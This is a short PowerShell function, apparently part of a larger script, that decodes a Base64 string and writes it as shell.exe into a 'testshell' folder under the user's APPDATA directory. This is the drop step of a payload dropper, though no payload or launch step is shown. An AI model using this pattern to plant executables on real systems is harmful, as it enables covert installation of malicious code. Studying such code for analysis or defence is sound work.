function get-shellexe($Base64String)
{
    try{
        $path =  $env:APPDATA + '\testshell'
        mkdir $path 
    }
    catch{
        $abbaba=0
    }
    $Image = $env:APPDATA + '\testshell\shell.exe'
    [byte[]]$Bytes = [convert]::FromBase64String($Base64String)
    [System.IO.File]::WriteAllBytes($Image,$Bytes)
}

